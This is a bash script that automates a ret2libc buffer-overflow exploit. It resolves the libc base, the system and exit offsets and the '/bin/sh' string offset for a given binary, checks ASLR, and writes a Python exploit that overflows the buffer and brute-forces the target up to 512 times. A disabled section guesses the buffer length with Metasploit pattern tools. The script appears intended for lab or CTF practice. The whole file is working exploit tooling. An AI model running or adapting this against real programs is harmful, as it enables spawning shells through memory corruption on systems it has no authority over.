#!/bin/bash

showUsage()
{
  echo "Usage:"
  echo "Required:"
  echo "$0 <binary>"
  echo "Optional: "
  echo "$0 <binary> <buffer_size>"
  echo "If buffer_size not inputted, the script tries to evaluate buffersize automatically."
}

#Error msg
ERROR=""

#Exploit file
ex_file="exploit.py"

#Global vars
binary=""
binaryPath="" #Tell whether path is absoulte or relative
aslr=""

#Ret2LibcAddrs
libc_path=""
libc_addr=""
system_off=""
exit_off=""
argSH_off=""

#Bufferlen
buffLen="0"

######################
####   GET ADDRs  ####
######################

getLibcPath()
{
  #Get path of libc
  echo $( ldd $binary | grep libc | awk -F ' ' '{print $3}')
}

getLibcAddr()
{
      #Get linkage  #Get libc   #Remove () from (<addr>)  #Get libc addr
   echo $( ldd $binary | grep libc | sed -e 's/(\(.*\))/\1/' | awk -F ' ' '{print $4}' )
}

getOffsetAddr()
{
  if [ -z ${libc_path} ]
  then
     ERROR="[-] Error could not get offset, because path of libc could not be definded!"
     exitSH
  else
           # Search for the system and exit addr       # Get offset
     echo "0x"$( readelf -s $libc_path | grep " $1@@GLIBC" | awk -F ' ' '{print $2}' )
  fi
}

getSHOffset()
{
    if [ -z ${libc_path} ]
    then
       ERROR="[-] Error could not get offset, because path of libc could not be definded!"
       exitSH
    else
               #Strings on libc_addr   # Find /bin/sh   #Get offset of /bin/sh
       local sh=$( strings -atx $libc_path | grep "/bin/sh" | awk -F ' ' '{print $1}' )
       sh_len=$(echo -n $sh | wc -c)
       #Make it clean hex num --> eg: (17eaaa -> 0x0017eaaa)
       while ((sh_len < 8))
       do
         sh="0"$sh
         sh_len=$(echo -n $sh | wc -c)
       done
       sh="0x"$sh
       echo $sh
    fi
}

#Set Ret2Libc Addresses
setAddrs()
{
  #Get path of libc library
  libc_path=$(getLibcPath)
  #Set libc_addr
  libc_addr=$(getLibcAddr)
  #Set system_offset
  system_off=$(getOffsetAddr system)
  #Set exit
  exit_off=$(getOffsetAddr exit)
  #Set /bin/sh offset
  argSH_off=$(getSHOffset)
}

#Show addresses if all found
showAddrs()
{
  if [ -z ${libc_addr} ] || [ -z ${system_off} ] || [ -z ${exit_off} ] || [ -z ${argSH_off} ]
   then
      ERROR="[-] Could not get the needed addresses for ret2libc!"
      exitSH
   else
      echo "[+] All addresses found:"
      echo "Libc address: "$libc_addr
      echo "System offset: "$system_off
      echo "Exit offset: "$exit_off
      echo "Argv (sh) offset: "$argSH_off
  fi
}

#Check if ASLR is active
checkASLR()
{
#Check for aslr --> if two times same addr aslr is off
echo "[*] Checking for ASLR..."
if [ "$(getLibcAddr)" == "$(getLibcAddr)" ]
 then
    aslr="off"
    echo "[+] ASLR is $aslr!"
 else
    aslr="on"
    echo "[~] ASLR is $aslr! :/"
 fi
}

####################################################################
###############     Create python exploit script      ##############
####################################################################

addToScript()
{
    echo "$1" >> $ex_file
    if [ ! -z ${2} ]
     then
        echo " " >> $ex_file
    fi
}

makePyScript()
{

  #Set Ret2Libc Addresses
  setAddrs
  #Show addresses
  showAddrs

  #Check for aslr
  checkASLR

  :' #Check if bufferLen is setAddrs
  if [ -z ${bufferLen} ]
  then
     getBufferLen
  fi
  '

  echo "[*] Generating python script..."
                                      #N for extra blank line
  addToScript "#!/usr/bin/env python" n
  addToScript "import struct"
  addToScript "from subprocess import call" n
  addToScript "#Addresses for ret2libc"
  addToScript "libc_addr = $libc_addr" n
  addToScript "system_off = $system_off #System"
  addToScript "exit_off = $exit_off #Exit"
  addToScript "argSH_off = $argSH_off # /bin/sh" n
  addToScript "system_addr = struct.pack(\"<I\", libc_addr+system_off)"
  addToScript "exit_addr = struct.pack(\"<I\", libc_addr+exit_off)"
  addToScript "arg_addr = struct.pack(\"<I\", libc_addr+argSH_off)" n
  addToScript "buffer = 'A'*$buffLen"

  if [ ${aslr} == "on" ]
   then
     addToScript "payload = buffer + system_addr + exit_addr + arg_addr"
      addToScript "i = 0"
      addToScript "while (i < 512):"
      addToScript " print 'Try :%s' %i"
      addToScript " i += 1"
      addToScript " ret = call([\"$binary\",payload])"
    else
      addToScript "print buffer + system_addr + exit_addr + arg_addr"
  fi

  chmod +x $ex_file
}

exitSH()
{
  echo $ERROR
  exit 1
}

: '
#Still experimetal --> therefore disabled for now
getBufferLen()
{
  pattern_create=$(locate "pattern_create.rb" 2>/dev/null)
  pattern_offset=$(locate "pattern_offset.rb" 2>/dev/null)
  if [ -z ${pattern_create} ] && [ -z ${patten_offset} ]
    then
      echo "[!] Buffer size detection tools pattern_create.rb and/or pattern_offset.rb were not found! Please enter buffer manually!"
      read -p "Enter buffer size: " buffLen
    else
      echo "[+] Buffer size detection tools are installed! Trying to find buffer size now..."

      #Get pattern out of segfault (Do yourself a favor and dont look at this line...)
      query=$(echo -n $($pattern_create -l 1000) | $binary | dmesg | grep -oh "segfault at [0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]" | tail -1 | awk -F " " "{print $3}")
      #Get bufflen by looking at which place the eip is overwritten in the pattern
      buffLen=$($pattern_offset -q $query 2>/dev/null | grep -oh "offset [0-9]*" | awk -F " " "{print $2}")
      ((buffLen+=1))
      if [ ! -z ${buffLen} ]
       then
          echo "[+] Found buffer size: $buffLen!"
       else
          echo "[-] Could not file buffer size! Please enter buffer size manually"
          read -p "Enter buffer size: " buffLen
      fi
  fi
}
'

####################################################################

if [ -z ${1} ] || [ -z ${2} ]
 then
    showUsage
    exit 1
  else
    binary=$1 #Set binary file
    if [[ ${binary} != /* ]]
     then
        binary=$(realpath $binary)
     fi
    if [ ! -z ${2} ]
    then
       buffLen=$2 #Set buffer len
    fi
fi

#Generate python script
makePyScript
